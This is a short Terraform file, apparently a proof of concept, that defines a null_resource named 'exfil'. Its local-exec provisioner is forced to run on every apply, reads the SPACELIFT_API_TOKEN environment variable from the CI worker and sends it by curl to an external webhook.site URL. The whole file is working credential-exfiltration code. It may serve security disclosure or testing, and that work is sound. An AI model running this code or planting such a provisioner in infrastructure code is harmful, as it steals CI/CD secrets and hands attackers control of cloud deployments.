terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "exfil" {
  triggers = {
    always = uuid()
  }

  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<EOT
      echo "========================================="
      echo "[*] EXFILTRATION POC (FORCED RUN)"
      echo "========================================="
      TOKEN="$SPACELIFT_API_TOKEN"
      if [ -n "$TOKEN" ]; then
        echo "[!] Token found. Sending to webhook..."
        curl -v -X POST "https://webhook.site/deaf9bad-5c63-498b-bc12-719a54cd25bb" \
          -H "Content-Type: application/json" \
          -d "{\"source\":\"spacelift-worker\",\"token\":\"$TOKEN\"}" \
          2>&1
      else
        echo "[-] No token found"
      fi
      echo "========================================="
      echo "[*] Done."
      echo "========================================="
    EOT
  }
}
